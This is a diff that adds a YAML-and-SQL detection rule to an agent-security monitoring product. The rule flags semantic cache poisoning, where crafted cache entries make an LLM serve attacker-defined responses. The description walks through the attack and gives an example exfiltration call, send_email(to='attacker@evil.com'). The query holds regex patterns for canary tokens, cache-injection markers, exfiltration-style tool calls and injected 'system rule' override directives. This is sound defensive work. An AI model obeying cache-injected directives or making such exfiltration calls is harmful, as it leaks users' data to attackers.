@@ -1,0 +1,98 @@
+id: rp-029
+name: "Semantic Cache Poisoning Detector"
+version: "0.1.1"
+description: >
+  Detects semantic cache poisoning attacks where adversaries inject crafted entries into
+  LLM semantic caching infrastructure (AWS ElastiCache AI, Azure Semantic Cache, LangChain
+  GPTCache) to cause other users to receive attacker-defined responses via embedding
+  vector key collisions. CacheAttack (arXiv:2601.23088, Jan 2026) achieves 86% response
+  hijacking rate across AWS, Azure, and Alibaba Cloud deployments. NDSS 2026 paper confirms
+  the attack works at all three major public clouds. Distinct from rp-009 (RAG Knowledge
+  Base Poisoning) which monitors retrieval content for override language — this rule detects
+  kill-chain canary token propagation (arXiv:2603.28013), cache injection metadata markers,
+  and agent tool calls reflecting injected LLM responses. The key difference: semantic
+  cache poisoning targets the serving-layer cache between the user query and LLM, not the
+  vector store behind RAG retrieval.
+  References: OWASP LLM01:2025, OWASP LLM02:2025, NDSS 2026, arXiv:2601.23088 (CacheAttack,
+  Jan 2026), arXiv:2603.28013 (Kill-Chain Canaries, MIT/UChicago Mar 2026) -
+  https://arxiv.org/abs/2601.23088,
+  https://www.ndss-symposium.org/ndss-paper/when-cache-poisoning-meets-llm-systems-semantic-cache-poisoning-and-its-countermeasures/,
+  https://arxiv.org/abs/2603.28013,
+  Example: tool_result contains "SECRET-A4F2C8" (kill-chain canary propagation token, arXiv:2603.28013) or assistant_message calls "send_email(to='attacker@evil.com')" triggered by cache-hijacked LLM response
+  https://github.com/dequeueing/SemanticCache_Poisoning
+severity: critical
+category: prompt_injection_and_hijacking
+fp_rate: low
+hook_sources: "tool_complete,llm_response"
+required_telemetry: ""
+author: "AgentGuard Research Team"
+tags:
+  - security
+  - prompt-injection
+  - semantic-cache
+  - cache-poisoning
+  - cacheattack
+  - owasp-llm01
+  - owasp-llm02
+  - ndss-2026
+  - kill-chain-canaries
+  - arXiv-2601.23088
+  - arXiv-2603.28013
+query_sql: |
+  -- rp-029 v0.1.0 — Semantic Cache Poisoning Detector
+  -- Signals:
+  --   1. Kill-chain canary token SECRET-[A-F0-9]{6,12} in tool_result — per arXiv:2603.28013
+  --      canary methodology; these tokens only appear in deliberately injected payloads that
+  --      track propagation stages (EXPOSED→PERSISTED→RELAYED→EXECUTED).
+  --   2. Explicit cache injection marker in tool_result — attacker-controlled metadata fields
+  --      used in CacheAttack framework and pentest tooling to label injected cache entries.
+  --   3. Injected tool call directive in assistant_message — LLM reflects cache-hijacked content
+  --      by calling exfil-class tools it was not asked to call; this is the EXECUTED stage.
+  --   4. Cache poisoning label in tool_result — attacker testing or tooling that labels entries
+  --      explicitly (pentest payloads, security research frameworks).
+  -- Note: rp-009 covers RAG retrieval override language (tool_result from retrieval tools);
+  --   this rule covers serving-layer cache signals (canary tokens, metadata markers, exfil
+  --   directives reflected in assistant_message). These are distinct attacker mechanisms.
+  SELECT
+    event_time AS detected_at,
+    'rp-029' AS rule_id,
+    'Semantic Cache Poisoning Detector' AS rule_name,
+    'critical' AS severity,
+    agent_id,
+    deployment_id,
+    session_id,
+    run_id,
+    raw_hook_name AS hook_name,
+    tool_name,
+    concat(
+      'Semantic cache poisoning signal detected. Event: ', event_type,
+      ', Tool: [', coalesce(tool_name, 'unknown'), ']',
+      ', Agent: ', agent_id,
+      '. Possible cache-hijacked LLM response serving attacker-defined content.'
+    ) AS message,
+    raw_event_data AS event_data
+  FROM agentguard_cim_event
+  WHERE event_type IN ('tool_complete', 'llm_response')
+    AND (
+      -- Signal 1: Kill-chain canary token in tool_result (arXiv:2603.28013)
+      -- Cryptographic token SECRET-[A-F0-9]{6,12} appears ONLY in deliberately injected payloads
+      -- tracking propagation stages. Legitimate tool results never contain this pattern.
+      match(tool_result, 'SECRET-[A-F0-9]{6,12}')
+
+      -- Signal 2: Explicit cache injection metadata marker in tool_result
+      -- CacheAttack framework and pentest tooling use these fields to label injected cache entries
+      OR match(lower(tool_result), '\[cache.inject.marker\]|\[cache.hit.payload\]|\[cached.response.id\]|cache-inject-marker')
+
+      -- Signal 3: Cache poisoning explicitly labeled in tool_result
+      -- Attacker testing payloads or red-team tooling that self-labels the injected entry
+      OR match(lower(tool_result), 'cache.{0,20}(poison(ed|ing)?|hijack(ed|ing)?|inject(ed|ion)?)')
+
+      -- Signal 4: Agent executing injected tool call directive (EXECUTED stage)
+      -- Cache-hijacked LLM response causes agent to call exfil/send tools without user request
+      -- Only fires when assistant_message contains a tool-call invocation pattern with exfil verb
+      OR match(lower(assistant_message), '(send_email|exfil_data|data_export|dump_context|upload_file|http_post)\s*\(')
+
+      -- Signal 5: Injected "system rule" override reflected in LLM response (EXECUTED stage)
+      -- Cache-hijacked response carries the injected directive verbatim into assistant output
+      OR match(lower(assistant_message), '(system rule|cache rule|override rule):\s*(always|forward|send|ignore|exfiltrate)')
+    )
